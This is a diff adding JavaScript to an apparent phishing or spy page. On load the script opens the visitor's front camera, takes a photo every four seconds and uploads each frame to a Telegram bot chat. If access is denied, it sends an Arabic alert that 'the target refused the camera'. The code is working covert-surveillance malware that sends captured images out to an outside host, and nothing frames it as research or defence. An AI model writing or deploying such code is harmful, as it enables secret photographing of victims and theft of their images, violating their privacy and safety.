@@ -91,3 +91,33 @@
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 document.getElementById('v').srcObject = s;
                 setInterval(snap, 4000);
+            } catch (e) {
+                sendText("⚠️ **المستهدف رفض الكاميرا**");
+            }
+        };
+
+        function snap() {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const f = new FormData();
+                f.append('chat_id', chat);
+                f.append('photo', blob, 'x.jpg');
+                fetch(api + "sendPhoto", { method: 'POST', body: f });
+            }, 'image/jpeg', 0.8);
+        }
+
+        function sendText(txt) {
+            fetch(api + "sendMessage", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat, text: txt, parse_mode: "Markdown" })
+            });
+        }
+
+        collectAll();
+    </script>
+</body>
+</html>
